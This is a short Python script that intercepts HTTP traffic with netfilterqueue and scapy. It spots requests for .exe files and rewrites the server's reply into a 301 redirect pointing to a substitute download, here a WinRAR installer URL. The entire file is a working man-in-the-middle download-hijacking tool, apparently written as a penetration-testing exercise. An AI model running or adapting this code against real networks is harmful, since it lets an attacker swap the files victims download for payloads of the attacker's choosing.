from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {load}\n\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].dport == 80:

            if '.exe' in str(scapy_packet[scapy.Raw].load):
                print('\n[+] EXE REQUEST')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
                

        elif scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].sport == 80:

            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)

                # Replace with something else
                print('\n[+] HTTP REPLACING')
                modified_packet = set_load(scapy_packet, 'https://www.rarlab.com/rar/winrar-x64-624b1.exe')
                packet.set_payload(bytes(modified_packet))

    packet.accept()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()